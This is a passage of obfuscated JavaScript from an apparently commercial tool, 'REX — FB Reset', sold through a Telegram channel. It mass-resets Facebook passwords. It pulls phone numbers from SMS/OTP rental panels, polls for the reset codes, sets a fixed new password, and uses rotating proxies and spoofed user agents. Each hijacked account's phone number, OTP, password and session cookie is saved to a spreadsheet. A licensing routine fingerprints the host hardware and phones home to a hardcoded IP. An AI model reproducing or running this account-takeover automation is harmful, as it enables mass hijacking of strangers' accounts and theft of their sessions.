        const v1648 = getPhoneCountry(v1644),
          v1649 = getProxyCountry(v1645.proxy),
          v1650 = v1645.ua && v1645.ua.browserType ? v1645.ua.browserType.charAt(0x0).toUpperCase() + v1645.ua.browserType.slice(0x1) : "Unknown",
          v1651 = v1645.ua && v1645.ua.isMobile ? "Mobile" : "Desktop",
          v1652 = v1645.proxy ? v1645.proxy.host + ':' + v1645.proxy.port : "Direct",
          v1653 = v1649 ? '' + v1649.flag + v1649.iso : "Direct",
          v1654 = v1645.method || "send_sms:0",
          v1655 = v1645.ua && v1645.ua.userAgent ? v1645.ua.userAgent : "Unknown";
        v1610.success.push(v1644 + " | Method:" + v1654 + " | Browser:" + v1651 + '/' + v1650 + " | Country:" + v1648.flag + v1648.name + " | Proxy:" + v1653 + '\x20(' + v1652 + ") | UA:" + v1655);
        if (v1645.proxyIdx >= 0x0) proxyManager.recordSuccess(v1645.proxyIdx);
        if (v1605 && v1605.autoConfirm) {
          const v1656 = v1615.get(v1644);
          if (v1656) {
            const v1657 = await smsBowerPollOtp(v1605.apiKey, v1656, 0xdbba0);
            if (v1657) try {
              const v1658 = v1605.newPassword || "Password@2026",
                v1659 = await processConfirm(v1644, v1657, v1658, 0x0);
              if (v1659.result === "confirmed") {
                v1608.record("confirmed_auto", v1644, v1659.ua, v1659.hostCtx, v1659.proxy ? v1659.proxy.host + ':' + v1659.proxy.port : "Direct", v1659.proxy);
                try {
                  const v1660 = require("xlsx"),
                    v1661 = path.join(__dirname, "results", "auto_confirmed.xlsx"),
                    v1662 = {};
                  v1662.recursive = true;
                  if (!fs.existsSync(path.join(__dirname, "results"))) fs.mkdirSync(path.join(__dirname, "results"), v1662);
                  let v1663, v1664;
                  fs.existsSync(v1661) ? (v1663 = v1660.readFile(v1661), v1664 = v1663.Sheets[v1663.SheetNames[0x0]]) : (v1663 = v1660.utils.book_new(), v1664 = v1660.utils.aoa_to_sheet([["Phone", "OTP", "New Password", "Cookie"]]), v1660.utils.book_append_sheet(v1663, v1664, "Confirmed"));
                  const v1665 = v1660.utils.decode_range(v1664["!ref"] || 'A1'),
                    v1666 = v1665.e.r + 0x1,
                    v1667 = {};
                  v1667.r = v1666, v1667.c = 0x0;
                  const v1668 = {};
                  v1668.origin = v1667, v1660.utils.sheet_add_aoa(v1664, [[v1644, v1657, v1658, v1659.cookieStr || '']], v1668);
                  const v1669 = {};
                  v1669.r = 0x0, v1669.c = 0x0;
                  const v1670 = {};
                  v1670.r = v1666, v1670.c = 0x3;
                  const v1671 = {};
                  v1671.s = v1669, v1671.e = v1670, v1664["!ref"] = v1660.utils.encode_range(v1671), v1660.writeFile(v1663, v1661);
                } catch (v1672) {
                  fs.appendFileSync(path.join(__dirname, "results", "auto_confirmed.txt"), v1644 + '|' + v1657 + '|' + (v1605.newPassword || "Password@2026") + '|' + (v1659.cookieStr || '') + '\x0a');
                }
              }
            } catch (v1673) {} else await smsBowerSetStatus(v1605.apiKey, v1656, 0x8);
          }
        }
        if (v1606 && v1606.autoConfirm) {
          const v1674 = await zenexPollOtp(v1606.apiKey, v1644, 0xdbba0);
          if (v1674) try {
            const v1675 = v1606.newPassword || "Password@2026",
              v1676 = await processConfirm(v1644, v1674, v1675, 0x0);
            if (v1676.result === "confirmed") {
              v1608.record("confirmed_auto", v1644, v1676.ua, v1676.hostCtx, v1676.proxy ? v1676.proxy.host + ':' + v1676.proxy.port : "Direct", v1676.proxy);
              try {
                const v1677 = require("xlsx"),
                  v1678 = path.join(__dirname, "results", "auto_confirmed.xlsx"),
                  v1679 = {};
                v1679.recursive = true;
                if (!fs.existsSync(path.join(__dirname, "results"))) fs.mkdirSync(path.join(__dirname, "results"), v1679);
                let v1680, v1681;
                fs.existsSync(v1678) ? (v1680 = v1677.readFile(v1678), v1681 = v1680.Sheets[v1680.SheetNames[0x0]]) : (v1680 = v1677.utils.book_new(), v1681 = v1677.utils.aoa_to_sheet([["Phone", "OTP", "New Password", "Cookie"]]), v1677.utils.book_append_sheet(v1680, v1681, "Confirmed"));
                const v1682 = v1677.utils.decode_range(v1681["!ref"] || 'A1'),
                  v1683 = v1682.e.r + 0x1,
                  v1684 = {};
                v1684.r = v1683, v1684.c = 0x0;
                const v1685 = {};
                v1685.origin = v1684, v1677.utils.sheet_add_aoa(v1681, [[v1644, v1674, v1675, v1676.cookieStr || '']], v1685);
                const v1686 = {};
                v1686.r = 0x0, v1686.c = 0x0;
                const v1687 = {};
                v1687.r = v1683, v1687.c = 0x3;
                const v1688 = {};
                v1688.s = v1686, v1688.e = v1687, v1681["!ref"] = v1677.utils.encode_range(v1688), v1677.writeFile(v1680, v1678);
              } catch (v1689) {
                fs.appendFileSync(path.join(__dirname, "results", "auto_confirmed.txt"), v1644 + '|' + v1674 + '|' + (v1606.newPassword || "Password@2026") + '|' + (v1676.cookieStr || '') + '\x0a');
              }
            }
          } catch (v1690) {}
        }
      } else {
        if (v1645.result === "no_account") {
          v1610.noAccount.push(v1644);
          if (v1645.proxyIdx >= 0x0) proxyManager.recordSuccess(v1645.proxyIdx);
        } else {
          if (v1645.result === "no_sms") {
            v1610.noSms.push(v1644);
            if (v1645.proxyIdx >= 0x0) proxyManager.recordSuccess(v1645.proxyIdx);
          } else {
            if (v1645.result === "captcha") {
              v1610.captcha.push(v1644);
              if (v1645.proxyIdx >= 0x0) proxyManager.recordSuccess(v1645.proxyIdx);
            } else {
              v1610.errors.push(v1644);
              if (v1645.proxyIdx >= 0x0 && v1645.proxyFault === true) proxyManager.recordFailure(v1645.proxyIdx);else v1645.proxyIdx >= 0x0 && proxyManager.recordSuccess(v1645.proxyIdx);
            }
          }
        }
      }
      await sleep(0x3e8);
    }
  }
  const v1618 = v1601 || v1604 || v1605 || v1606 ? (v1601 || v1604 || v1605 || v1606).totalCount : v1597.length,
    v1619 = Math.min(v1598, v1618 || v1598);
  const v1620 = {};
  v1620.length = v1619;
  const v1621 = Array.from(v1620, fn24);
  return await Promise.all(v1621), v1608.stop(), v1610;
}
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(C("   ____                                      _  ___              ")), console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  ")), console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | ")), console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | ")), console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | ")), console.log(C("                       |_|                                |___/  \n")), console.log(W("┌──────────────────────────────────────────────┐"));
  console.log(W("│ [•] Tool      : ") + C("REX — FB Reset               ") + W('│'));
  console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
  console.log(W("│ [•] Version   : ") + C("7.0.0                        ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License Verified     ") + W('│')), global.CURRENT_HWID && console.log(W("│ [•] Hardware  : ") + Y(global.CURRENT_HWID.padEnd(0x1d)) + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
let _cachedHWID = null;
function generateHWID() {
  if (_cachedHWID) return _cachedHWID;
  const {
      execSync: v1691
    } = require("child_process"),
    v1692 = require('os'),
    v1693 = v1692.platform();
  try {
    if (v1693 === "win32") {
      const v1694 = {};
      v1694.stdio = "pipe", v1694.timeout = 0x3a98;
      const v1695 = v1691("powershell -NoProfile -Command \"$mg = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter 'DeviceID=\\'C:\\'' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join '|')\"", v1694).toString().trim();
      if (!v1695) throw new Error("No hardware data");
      const v1696 = crypto.createHash("sha256").update(v1695).digest("hex").toUpperCase();
      return _cachedHWID = "SKING-" + v1696.substring(0x0, 0x8) + '-' + v1696.substring(0x8, 0xc) + '-' + v1696.substring(0xc, 0x10), _cachedHWID;
    } else {
      let v1697 = [];
      try {
        const v1700 = v1691("settings get secure android_id 2>/dev/null || echo \"\"", {
          'stdio': "pipe",
          'timeout': 0x1388
        }).toString().trim();
        if (v1700 && v1700 !== "null") v1697.push('A:' + v1700);
      } catch (v1701) {}
      try {
        if (fs.existsSync("/proc/cpuinfo")) {
          const v1702 = fs.readFileSync("/proc/cpuinfo", "utf8"),
            v1703 = v1702.match(/Serial\s*:\s*(\S+)/i),
            v1704 = v1702.match(/Hardware\s*:\s*(.+)/i);
          if (v1703 && v1703[0x1] !== "0000000000000000") v1697.push('S:' + v1703[0x1].trim());
          if (v1704) v1697.push('H:' + v1704[0x1].trim());
        }
      } catch (v1705) {}
      try {
        if (fs.existsSync("/etc/machine-id")) {
          const v1706 = fs.readFileSync("/etc/machine-id", "utf8").trim();
          if (v1706) v1697.push('M:' + v1706);
        }
      } catch (v1707) {}
      try {
        const v1708 = v1692.cpus(),
          v1709 = v1708 && v1708.length > 0x0 ? v1708[0x0].model : "UnknownCPU",
          v1710 = v1692.totalmem(),
          v1711 = v1692.release(),
          v1712 = v1692.hostname();
        v1697.push('F:' + v1709 + '|' + v1710 + '|' + v1711 + '|' + v1712);
      } catch (v1713) {}
      const v1698 = v1697.join('||'),
        v1699 = crypto.createHash("sha256").update(v1698).digest("hex").toUpperCase();
      return _cachedHWID = "ANKING-" + v1699.substring(0x0, 0x8) + '-' + v1699.substring(0x8, 0xc) + '-' + v1699.substring(0xc, 0x10), _cachedHWID;
    }
  } catch (v1714) {
    return '';
  }
}
function verifyServerSignature(v1715, v1716) {
  if (!v1716) return false;
  try {
    return crypto.verify(null, Buffer.from(v1715, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v1716, "base64"));
  } catch (v1717) {
    return false;
  }
}
async function validateLicense() {
  console.log("  [33m[*] Validating license...[0m");
  const v1718 = generateHWID();
  !v1718 && (console.error(R("\n  ✗ Could not generate Hardware ID.\n")), process.exit(0x1));
  global.CURRENT_HWID = v1718;
  const v1719 = Date.now();
  try {
    const v1720 = await new Promise((v1721, v1722) => {
      const v1723 = {};
      v1723.hwid = v1718, v1723.app_id = "reset", v1723.version = "2.0.2", v1723.timestamp = v1719;
      const v1724 = JSON.stringify(v1723);
      const v1725 = {
          'hostname': "188.137.176.163",
          'port': 0xec1,
          'path': "/api/verify",
          'method': "POST",
          'headers': {
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v1724)
          },
          'timeout': 0x1f40
        },
        v1726 = http.request(v1725, v1727 => {
          let v1728 = '';
          v1727.on("data", v1729 => v1728 += v1729);
          v1727.on("end", () => {
            try {
              v1721(JSON.parse(v1728));
            } catch (v1730) {
              v1722(v1730);
            }
          });
        });
      v1726.on("error", v1722);
      v1726.on("timeout", function () {
        this.destroy();
        v1722(new Error("Timeout"));
      });
      v1726.write(v1724), v1726.end();
    });
    if (v1720) {
      v1720.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
      if (v1720.status === "banned" || v1720.status === "expired" || !v1720.sig) {
        await new Promise(v1734 => setTimeout(v1734, 0x7d0));
        let v1733 = String(v1720.reason || "NOT REGISTERED");
        if (!v1720.reason && !v1720.sig) v1733 = "NOT REGISTERED / REMOVED";
        console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — RESET TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v1718.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v1733.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
      }
      const v1731 = v1718 + "|reset|2.0.2|" + v1719;
      !verifyServerSignature(v1731, v1720.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
      let v1732 = v1720.token;
      return !v1732 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(0x1)), setInterval(() => {
        !v1732 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
        const v1735 = {};
        v1735.hwid = v1718, v1735.app_id = "reset", v1735.token = v1732;
        const v1736 = JSON.stringify(v1735),
          v1737 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/ping",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v1736)
            },
            'timeout': 0x1388
          };
        const v1738 = http.request(v1737, v1739 => {
          let v1740 = '';
          v1739.on("data", v1741 => v1740 += v1741), v1739.on("end", () => {
            try {
              const v1742 = JSON.parse(v1740);
              v1742.status === 'ok' && v1742.token ? v1732 = v1742.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(0x1));
            } catch (v1743) {
              console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(0x1);
            }
          });
        });
        v1738.on("error", () => {
          console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
          process.exit(0x1);
        });
        v1738.on("timeout", function () {
          this.destroy();
          console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(0x1);
        }), v1738.write(v1736);
        v1738.end();
      }, 0xafc8), console.log("  [32m[✓] License valid — Welcome![0m"), global.CURRENT_USER = "Licensed", global.SYNC_STATUS = "up to date", true;
    }
  } catch (v1744) {
    console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.\n")), process.exit(0x1);
  }
}
async function selectOption(v1745, v1746) {
  return new Promise(v1747 => {
    let v1748 = 0x0;
    process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn25 = () => {
      process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("👑 " + v1745) + '\x0a');
      v1746.forEach((v1749, v1750) => {
        v1750 === v1748 ? console.log("   " + chalk.hex("#00F0FF").bold('➔') + '\x20\x20' + chalk.hex("#00FF88").bold(v1749.name)) : console.log("      " + chalk.hex("#888888")(v1749.name));
      });
      console.log('');
    };
    fn25();
    const fn26 = (v1751, v1752) => {
      v1752.ctrl && v1752.name === 'c' && process.exit(0x0);
      if (v1752.name === 'up') v1748 = (v1748 - 0x1 + v1746.length) % v1746.length, fn25();else {
        if (v1752.name === "down") v1748 = (v1748 + 0x1) % v1746.length, fn25();else {
          if (v1752.sequence && /^[1-9]$/.test(v1752.sequence)) {
            const v1753 = parseInt(v1752.sequence, 0xa) - 0x1;
            v1753 >= 0x0 && v1753 < v1746.length && (v1748 = v1753, fn25());
          } else {
            if (v1752.name === "return") {
              if (process.stdin.isTTY) process.stdin.setRawMode(false);
              process.stdin.removeListener("keypress", fn26), v1747(v1746[v1748].value);
            }
          }
        }
      }
    };
    process.stdin.on("keypress", fn26);
  });
}
async function promptText(v1754, v1755) {
  return new Promise(v1756 => {
    process.stdout.write('\x20\x20' + FB_CYAN('➔') + '\x20' + FB_GOLD(v1754) + '\x20');
    let v1757 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn27 = v1758 => {
      const v1759 = v1758.toString();
      if (v1759.includes('\x0a') || v1759.includes('\x0d')) {
        process.stdin.removeListener("data", fn27), v1757 += v1759.split(/[\r\n]/)[0x0];
        let v1760 = v1757.trim();
        if (v1760.startsWith('\x22') && v1760.endsWith('\x22')) v1760 = v1760.slice(0x1, -1);else v1760.startsWith('\x27') && v1760.endsWith('\x27') && (v1760 = v1760.slice(0x1, -1));
        v1756(v1760 || v1755);
      } else v1757 += v1759;
    };
    process.stdin.on("data", fn27);
  });
}
async function pickNumbersSource() {
  let v1761 = "numbers.txt";
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    {
      const v1762 = {};
      v1762.name = "✏️ Custom File Path", v1762.value = "custom";
      const v1763 = {};
      v1763.name = "⬅️ Go Back to Mode Selection", v1763.value = "back";
      const v1764 = await selectOption("SELECT NUMBER SOURCE", [v1762, {
          'name': "🌐 Auto fetch from NexaOTP Panel",
          'value': "nexa"
        }, {
          'name': "⚡ Auto fetch from Voltx (2oo9)",
          'value': "voltx"
        }, {
          'name': "🔥 Auto fetch from Stex (2oo9)",
          'value': "stex"
        }, {
          'name': "📱 Auto fetch from SMS Bower",
          'value': "smsbower"
        }, {
          'name': "⚡ Auto fetch from Zenex",
          'value': "zenex"
        }, v1763]),
        v1765 = {};
      v1765.back = true;
      if (v1764 === "back") return v1765;
      if (v1764 === "voltx" || v1764 === "stex") {
        const v1768 = v1764 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
          v1769 = v1764 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
          v1770 = v1764 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
          v1771 = v1764 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
        let v1772 = '',
          v1773 = [],
          v1774 = 0x32,
          v1775 = 0x1;
        while (v1775 <= 0x3) {
          process.stdout.write("[2J[H"), printHeader();
          if (v1775 === 0x1) {
            if (fs.existsSync(v1769)) {
              v1772 = fs.readFileSync(v1769, "utf8").trim();
              const v1778 = {};
              v1778.name = "Use saved key", v1778.value = "use";
              const v1779 = {};
              v1779.name = "Enter new key", v1779.value = "new";
              const v1780 = {};
              v1780.name = "Remove saved key", v1780.value = "remove";
              const v1781 = {};
              v1781.name = "⬅️ Back", v1781.value = "back";
              const v1782 = await selectOption(v1768 + " key (" + v1772.substring(0x0, 0xa) + "...)", [v1778, v1779, v1780, v1781]);
              if (v1782 === "back") {
                v1775 = 0x0;
                break;
              }
              if (v1782 === "remove") fs.existsSync(v1769) && fs.unlinkSync(v1769), v1772 = '';else v1782 === "new" && (v1772 = '');
            }
            if (!v1772) {
              v1772 = await promptText("Enter " + v1768 + " API Key (mauthapi):", '');
              if (v1772.toLowerCase() === "back") {
                v1775 = 0x0;
                break;
              }
              const v1783 = {};
              v1783.name = 'No', v1783.value = 'no';
              const v1784 = await selectOption("Save key?", [{
                'name': "Yes",
                'value': "yes"
              }, v1783]);
              if (v1784 === "yes" && v1772) fs.writeFileSync(v1769, v1772, "utf8");
            }
            if (v1772) v1775 = 0x2;
          } else {
            if (v1775 === 0x2) {
              const v1785 = {};
              v1785.name = "🔍 Auto Range Finder (scan console)", v1785.value = "auto";
              const v1786 = {};
              v1786.name = "✏️  Enter manually", v1786.value = "manual";
              const v1787 = {};
              v1787.name = "⬅️ Back", v1787.value = "back";
              const v1788 = await selectOption("How to select ranges?", [v1785, v1786, v1787]);
              if (v1788 === "back") {
                v1775 = 0x1;
                continue;
              }
              if (v1788 === "auto") {
                const v1789 = await autoRangeFinderFor2Oo(v1772, v1771, selectOption, promptText);
                v1789 && v1789.length > 0x0 && (v1773 = v1789, v1775 = 0x3);
              } else {
                v1773 = [];
                let v1790 = true;
                while (v1790) {
                  const v1791 = await promptText("Enter range #" + (v1773.length + 0x1) + " (e.g. 26134XXX) or 'back':", '');
                  if (v1791.toLowerCase() === "back") {
                    if (v1773.length === 0x0) break;else {
                      v1773.pop();
                      continue;
                    }
                  }
                  if (v1791) v1773.push(v1791);
                  const v1792 = {};
                  v1792.name = "Yes", v1792.value = "yes";
                  const v1793 = {};
                  v1793.name = 'No', v1793.value = 'no';
                  const v1794 = await selectOption("Added " + v1773.length + ". Add another?", [v1792, v1793]);
                  if (v1794 === 'no') v1790 = false;
                }
                if (v1773.length > 0x0) v1775 = 0x3;
              }
            } else {
              if (v1775 === 0x3) {
                const v1795 = await promptText("How many numbers? [default:50]:", '50');
                if (v1795.toLowerCase() === "back") {
                  v1775 = 0x2;
                  continue;
                }
                v1774 = parseInt(v1795) || 0x32, v1775 = 0x4;
              }
            }
          }
        }
        if (v1775 === 0x0) continue;
        const v1776 = {};
        v1776.provider = v1764, v1776.apiKey = v1772, v1776.getPath = v1770, v1776.consolePath = v1771, v1776.ranges = v1773, v1776.totalCount = v1774;
        const v1777 = {};
        return v1777.numbersFile = "numbers.txt", v1777.nexaConfig = null, v1777.smsBowerConfig = null, v1777.zenexConfig = null, v1777.twoOoConfig = v1776, v1777;
      } else {
        if (v1764 === "nexa") {
          let v1796 = '';
          const v1797 = path.join(__dirname, ".nexa_api_key");
          if (fs.existsSync(v1797)) {
            const v1808 = fs.readFileSync(v1797, "utf8").trim(),
              v1809 = {};
            v1809.name = "No, enter new key", v1809.value = 'no';
            const v1810 = {};
            v1810.name = "⬅️ Go Back", v1810.value = "back";
            const v1811 = await selectOption("Found saved API Key (..." + v1808.slice(-4) + "). Use it?", [{
              'name': "Yes, use saved key",
              'value': "yes"
            }, v1809, {
              'name': "Delete saved key",
              'value': "delete"
            }, v1810]);
            if (v1811 === "back") continue;
            if (v1811 === "yes") v1796 = v1808;else v1811 === "delete" && (fs.unlinkSync(v1797), console.log(G("\n   ✗ Saved key deleted.\n")));
          }
          if (!v1796) {
            v1796 = await promptText("Enter NexaOTP API Key (or type 'back'):", '');
            if (v1796.toLowerCase() === "back") continue;
            const v1812 = {};
            v1812.name = "Yes, save it", v1812.value = "yes";
            const v1813 = {};
            v1813.name = 'No', v1813.value = 'no';
            const v1814 = await selectOption("Save this key for future use?", [v1812, v1813]);
            v1814 === "yes" && (fs.writeFileSync(v1797, v1796, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
          }
          let v1798 = [],
            v1799 = true,
            v1800 = false;
          while (v1799) {
            const v1815 = await promptText("Enter range #" + (v1798.length + 0x1) + " (e.g. 21624485XXX) [or type 'back']:", '');
            if (v1815.toLowerCase() === "back") {
              v1800 = true;
              break;
            }
            if (v1815) v1798.push(v1815);
            const v1816 = {};
            v1816.name = "Yes", v1816.value = "yes";
            const v1817 = {};
            v1817.name = "No, proceed", v1817.value = 'no';
            const v1818 = await selectOption("Add another range?", [v1816, v1817]);
            if (v1818 === 'no') v1799 = false;
          }
          if (v1800) continue;
          const v1801 = await promptText("How many numbers to process? (default: 50):", '50');
          if (v1801.toLowerCase() === "back") continue;
          const v1802 = parseInt(v1801) || 0x32,
            v1803 = {};
          v1803.name = "Server 1 (/get)", v1803.value = "/api/v1/numbers/get";
          const v1804 = {};
          v1804.name = "Server 3 (/p3/get)", v1804.value = "/api/v1/numbers/p3/get";
          const v1805 = await selectOption("SELECT NEXA SERVER", [v1803, {
            'name': "Server 2 (/p2/get)",
            'value': "/api/v1/numbers/p2/get"
          }, v1804, {
            'name': "⬅️ Go Back",
            'value': "back"
          }]);
          if (v1805 === "back") continue;
          const v1806 = {};
          v1806.apiKey = v1796, v1806.ranges = v1798, v1806.totalCount = v1802, v1806.serverEndpoint = v1805;
          const v1807 = {};
          return v1807.numbersFile = "numbers.txt", v1807.nexaConfig = v1806, v1807.twoOoConfig = null, v1807.smsBowerConfig = null, v1807.zenexConfig = null, v1807;
        } else {
          if (v1764 === "smsbower") {
            let v1819 = '',
              v1820 = 'fb',
              v1821 = '0',
              v1822 = "0.5",
              v1823 = 0x32,
              v1824 = 0x1;
            while (v1824 <= 0x4) {
              process.stdout.write("[2J[H"), printHeader();
              if (v1824 === 0x1) {
                if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                  v1819 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                  const v1827 = {};
                  v1827.name = "Remove saved key", v1827.value = "remove";
                  const v1828 = {};
                  v1828.name = "⬅️ Back", v1828.value = "back";
                  const v1829 = await selectOption("SMS Bower key found (" + v1819.substring(0x0, 0xa) + "...)", [{
                    'name': "Use saved key",
                    'value': "use"
                  }, {
                    'name': "Enter new key",
                    'value': "new"
                  }, v1827, v1828]);
                  if (v1829 === "back") {
                    v1824 = 0x0;
                    break;
                  }
                  if (v1829 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v1819 = '';else {
                    if (v1829 === "new") v1819 = '';
                  }
                }
                if (!v1819) {
                  v1819 = await promptText("Enter SMS Bower API Key:", '');
                  if (v1819.toLowerCase() === "back") {
                    v1824 = 0x0;
                    break;
                  }
                  const v1830 = {};
                  v1830.name = "Yes", v1830.value = "yes";
                  const v1831 = {};
                  v1831.name = 'No', v1831.value = 'no';
                  const v1832 = await selectOption("Save key?", [v1830, v1831]);
                  if (v1832 === "yes" && v1819) fs.writeFileSync(SMSBOWER_KEY_FILE, v1819, "utf8");
                }
                if (v1819) v1824 = 0x2;
              } else {
                if (v1824 === 0x2) {
                  v1820 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                  if (v1820.toLowerCase() === "back") {
                    v1824 = 0x1;
                    continue;
                  }
                  v1820 = v1820 || 'fb', v1824 = 0x3;
                } else {
                  if (v1824 === 0x3) {
                    v1821 = await promptText("Country code (0 = any) [default: 0]:", '0');
                    if (v1821.toLowerCase() === "back") {
                      v1824 = 0x2;
                      continue;
                    }
                    v1821 = v1821 || '0';
                    const v1833 = await promptText("Max price per number [default: 0.5]:", "0.5");
                    v1822 = v1833 || "0.5", v1824 = 0x4;
                  } else {
                    if (v1824 === 0x4) {
                      const v1834 = await promptText("How many numbers? [default: 50]:", '50');
                      if (v1834.toLowerCase() === "back") {
                        v1824 = 0x3;
                        continue;
                      }
                      v1823 = parseInt(v1834) || 0x32, v1824 = 0x5;
                    }
                  }
                }
              }
            }
            if (v1824 === 0x0) continue;
            const v1825 = {};
            v1825.apiKey = v1819, v1825.service = v1820, v1825.country = v1821, v1825.maxPrice = v1822, v1825.totalCount = v1823;
            const v1826 = {};
            return v1826.numbersFile = "numbers.txt", v1826.nexaConfig = null, v1826.twoOoConfig = null, v1826.zenexConfig = null, v1826.smsBowerConfig = v1825, v1826;
          } else {
            if (v1764 === "zenex") {
              let v1835 = '',
                v1836 = [],
                v1837 = 0x32,
                v1838 = 0x1;
              while (v1838 <= 0x3) {
                process.stdout.write("[2J[H"), printHeader();
                if (v1838 === 0x1) {
                  if (fs.existsSync(ZENEX_KEY_FILE)) {
                    v1835 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                    const v1841 = await selectOption("Zenex key found (" + v1835.substring(0x0, 0xa) + "...)", [{
                      'name': "Use saved key",
                      'value': "use"
                    }, {
                      'name': "Enter new key",
                      'value': "new"
                    }, {
                      'name': "Remove saved key",
                      'value': "remove"
                    }, {
                      'name': "⬅️ Back",
                      'value': "back"
                    }]);
                    if (v1841 === "back") {
                      v1838 = 0x0;
                      break;
                    }
                    if (v1841 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v1835 = '';else {
                      if (v1841 === "new") v1835 = '';
                    }
                  }
                  if (!v1835) {
                    v1835 = await promptText("Enter Zenex API Key (mapikey):", '');
                    if (v1835.toLowerCase() === "back") {
                      v1838 = 0x0;
                      break;
                    }
                    const v1842 = {};
                    v1842.name = "Yes", v1842.value = "yes";
                    const v1843 = {};
                    v1843.name = 'No', v1843.value = 'no';
                    const v1844 = await selectOption("Save key?", [v1842, v1843]);
                    if (v1844 === "yes" && v1835) fs.writeFileSync(ZENEX_KEY_FILE, v1835, "utf8");
                  }
                  if (v1835) v1838 = 0x2;
                } else {
                  if (v1838 === 0x2) {
                    v1836 = [];
                    let v1845 = true;
                    while (v1845) {
                      const v1846 = await promptText("Enter range #" + (v1836.length + 0x1) + " (e.g. 4473845XXX) or 'back':", '');
                      if (v1846.toLowerCase() === "back") {
                        if (v1836.length === 0x0) {
                          v1838 = 0x1;
                          break;
                        } else {
                          v1836.pop();
                          continue;
                        }
                      }
                      if (v1846) v1836.push(v1846);
                      const v1847 = {};
                      v1847.name = "Yes", v1847.value = "yes";
                      const v1848 = {};
                      v1848.name = 'No', v1848.value = 'no';
                      const v1849 = await selectOption("Added " + v1836.length + ". Add another?", [v1847, v1848]);
                      if (v1849 === 'no') v1845 = false;
                    }
                    if (v1836.length > 0x0) v1838 = 0x3;
                  } else {
                    if (v1838 === 0x3) {
                      const v1850 = await promptText("How many numbers? [default: 50]:", '50');
                      if (v1850.toLowerCase() === "back") {
                        v1838 = 0x2;
                        continue;
                      }
                      v1837 = parseInt(v1850) || 0x32, v1838 = 0x4;
                    }
                  }
                }
              }
              if (v1838 === 0x0) continue;
              const v1839 = {};
              v1839.apiKey = v1835, v1839.ranges = v1836, v1839.totalCount = v1837;
              const v1840 = {};
              return v1840.numbersFile = "numbers.txt", v1840.nexaConfig = null, v1840.twoOoConfig = null, v1840.smsBowerConfig = null, v1840.zenexConfig = v1839, v1840;
            } else {
              if (v1764 === "custom") {
                const v1851 = await promptText("Enter Numbers File Path (or type 'back'):", "numbers.txt");
                if (v1851.toLowerCase() === "back") continue;
                v1761 = v1851;
              } else v1761 = v1764;
            }
          }
        }
      }
      const v1766 = path.resolve(v1761);
      if (!fs.existsSync(v1766)) fs.writeFileSync(v1766, '');
      const v1767 = {};
      return v1767.numbersFile = v1761, v1767.nexaConfig = null, v1767.twoOoConfig = null, v1767.smsBowerConfig = null, v1767.zenexConfig = null, v1767;
    }
  }
}
async function selectRetryCount() {
  const v1852 = {};
